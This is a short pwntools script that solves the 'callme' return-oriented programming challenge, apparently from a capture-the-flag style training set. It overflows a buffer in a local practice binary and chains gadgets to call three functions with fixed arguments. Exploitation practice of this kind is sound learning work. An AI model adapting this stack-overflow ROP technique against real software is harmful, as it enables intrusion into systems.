from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

p = process("./callme")
# gdb.attach(p, api=True)
e = ELF("./callme")
rop = ROP(e)

arg1 = 0xDEADBEEFDEADBEEF
arg2 = 0xCAFEBABECAFEBABE
arg3 = 0xD00DF00DD00DF00D

callme_one = e.plt["callme_one"]
callme_two = e.plt["callme_two"]
callme_three = e.plt["callme_three"]

# x86_64 calling convention passes args in order 1-3, RDI, RSI, RDX
pop_rdi_rsi_rdx_ret = rop.find_gadget(
    ["pop rdi", "pop rsi", "pop rdx", "ret"]).address
# For stack alignment
ret = rop.find_gadget(["ret"]).address

payload = b"A" * 32
payload += b"B" * 8
payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_one)
payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_two)
payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_three)

p.sendafter(b"> ", payload)

# pause()

p.recvline()
p.recvline()
p.recvline()
